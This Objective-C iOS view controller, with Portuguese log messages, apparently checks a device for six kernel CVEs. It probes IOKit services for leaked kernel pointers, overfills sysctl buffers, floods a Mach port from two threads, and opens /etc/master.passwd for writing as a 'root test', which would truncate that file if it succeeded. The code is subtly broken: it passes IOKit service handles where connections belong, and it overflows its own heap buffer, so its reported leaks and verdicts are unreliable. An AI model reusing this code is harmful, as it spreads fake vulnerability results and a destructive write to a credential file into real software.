#import "ViewController.h"
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <IOKit/IOKitLib.h>
#import <sys/sysctl.h>
#import <pthread.h>

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *logTextView;
@property (weak, nonatomic) IBOutlet UIButton *runButton;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.logTextView.editable = NO;
    self.logTextView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logTextView.text = @"Clique em 'Executar testes' para começar.\n";
}

- (IBAction)runTests:(id)sender {
    self.runButton.enabled = NO;
    [self appendLog:@"🚀 Iniciando testes de kernel...\n"];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self test_CVE_2026_43654];
        [self test_CVE_2026_28897];
        [self test_CVE_2026_28951];
        [self test_CVE_2026_28972];
        [self test_CVE_2026_28986];
        [self test_CVE_2026_28987];
        dispatch_async(dispatch_get_main_queue(), ^{
            [self appendLog:@"✅ Testes concluídos.\n"];
            self.runButton.enabled = YES;
        });
    });
}

// Helper para adicionar texto ao log (thread‑safe)
- (void)appendLog:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logTextView.text = [self.logTextView.text stringByAppendingString:msg];
        [self.logTextView scrollRangeToVisible:NSMakeRange(self.logTextView.text.length, 0)];
    });
}

// ========== CVE-2026-43654: IOKit leak kernel memory ==========
- (void)test_CVE_2026_43654 {
    [self appendLog:@"--- CVE-2026-43654: Kernel memory leak via IOKit ---\n"];
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGraphicsControl"));
    if (!service) {
        [self appendLog:@"[!] Serviço IOGraphicsControl não encontrado\n"];
        return;
    }
    uint64_t buffer[256];
    size_t size = sizeof(buffer);
    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, NULL, 0, buffer, &size, NULL, 0);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        [self appendLog:[NSString stringWithFormat:@"[-] IOKit falhou: %s\n", mach_error_string(kr)]];
        return;
    }
    BOOL leaked = NO;
    for (int i = 0; i < size / 8; i++) {
        if (buffer[i] > 0xfffffff000000000ULL && buffer[i] < 0xffffffffffffffffULL) {
            [self appendLog:[NSString stringWithFormat:@"[+] Ponteiro do kernel vazado: 0x%016llx\n", buffer[i]]];
            [self appendLog:[NSString stringWithFormat:@"[+] Base do kernel estimada: 0x%016llx\n", buffer[i] & 0xfffffffff0000000ULL]];
            leaked = YES;
        }
    }
    if (!leaked) [self appendLog:@"[-] Nenhum ponteiro do kernel vazado.\n"];
}

// ========== CVE-2026-28897: sysctl buffer overflow ==========
- (void)test_CVE_2026_28897 {
    [self appendLog:@"--- CVE-2026-28897: Kernel buffer overflow via sysctl ---\n"];
    int name[2] = { CTL_KERN, KERN_PROC };
    size_t oldlen = 0;
    sysctl(name, 2, NULL, &oldlen, NULL, 0);
    size_t small_len = 32;
    void *buf = malloc(small_len);
    if (!buf) return;
    int ret = sysctl(name, 2, buf, &oldlen, NULL, 0);
    free(buf);
    if (ret == 0 && oldlen > small_len) {
        [self appendLog:[NSString stringWithFormat:@"[!] Sysctl escreveu %zu bytes em buffer de %zu bytes – OOB write!\n", oldlen, small_len]];
    } else {
        [self appendLog:@"[-] Sysctl seguro (erro ou tamanho válido).\n"];
    }
}

// ========== CVE-2026-28951: root escalation ==========
- (void)test_CVE_2026_28951 {
    [self appendLog:@"--- CVE-2026-28951: Root privilege escalation ---\n"];
    if (getuid() == 0) {
        [self appendLog:@"[!] Já é root! (vulnerável ou já comprometido)\n"];
        return;
    }
    FILE *fp = fopen("/etc/master.passwd", "w");
    if (fp) {
        fclose(fp);
        [self appendLog:@"[!] Conseguiu escrever em /etc/master.passwd – ROOT!\n"];
    } else {
        [self appendLog:@"[-] Não conseguiu escrever (sandbox/permissão).\n"];
    }
}

// ========== CVE-2026-28972: IOKit OOB write ==========
- (void)test_CVE_2026_28972 {
    [self appendLog:@"--- CVE-2026-28972: Kernel OOB write via IOKit ---\n"];
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleA7IOP"));
    if (!service) {
        [self appendLog:@"[!] Serviço AppleA7IOP não encontrado\n"];
        return;
    }
    char bigBuffer[4096] = {0};
    size_t outputSize = 0;
    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, bigBuffer, sizeof(bigBuffer), NULL, &outputSize, NULL, 0);
    IOObjectRelease(service);
    if (kr == KERN_SUCCESS) {
        [self appendLog:@"[!] Chamada IOKit com buffer enorme passou – possível OOB write!\n"];
    } else {
        [self appendLog:[NSString stringWithFormat:@"[-] Chamada IOKit falhou (seguro): %s\n", mach_error_string(kr)]];
    }
}

// ========== CVE-2026-28986: Mach port race condition ==========
void *race_thread(void *arg) {
    mach_port_t port = (mach_port_t)(uintptr_t)arg;
    for (int i = 0; i < 5000; i++) {
        mach_msg_header_t msg = {0};
        msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        msg.msgh_size = sizeof(msg);
        msg.msgh_remote_port = port;
        mach_msg_send(&msg);
    }
    return NULL;
}
- (void)test_CVE_2026_28986 {
    [self appendLog:@"--- CVE-2026-28986: Kernel race condition (Mach ports) ---\n"];
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        [self appendLog:@"[!] Falha ao alocar porta Mach\n"];
        return;
    }
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        [self appendLog:@"[!] Falha ao inserir direito de envio\n"];
        return;
    }
    pthread_t t1, t2;
    pthread_create(&t1, NULL, race_thread, (void *)(uintptr_t)port);
    pthread_create(&t2, NULL, race_thread, (void *)(uintptr_t)port);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    mach_port_destroy(mach_task_self(), port);
    [self appendLog:@"[-] Race test concluído – sem crash detectado.\n"];
}

// ========== CVE-2026-28987: sysctl kernel state leak ==========
- (void)test_CVE_2026_28987 {
    [self appendLog:@"--- CVE-2026-28987: Leak sensitive kernel state ---\n"];
    int name[] = { CTL_KERN, KERN_OSRELEASE };
    char buffer[256];
    size_t len = sizeof(buffer);
    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0) {
        [self appendLog:[NSString stringWithFormat:@"[*] Kernel release: %s\n", buffer]];
    }
    name[1] = KERN_VERSION;
    len = sizeof(buffer);
    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0) {
        [self appendLog:[NSString stringWithFormat:@"[*] Kernel version: %s\n", buffer]];
    }
    // sysctl não documentado (exemplo)
    name[1] = 123;
    len = sizeof(buffer);
    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0 && len > 0) {
        [self appendLog:[NSString stringWithFormat:@"[!] Sysctl vazou dados: %s\n", buffer]];
    } else {
        [self appendLog:@"[-] Nenhum vazamento sensível detectado.\n"];
    }
}

@end
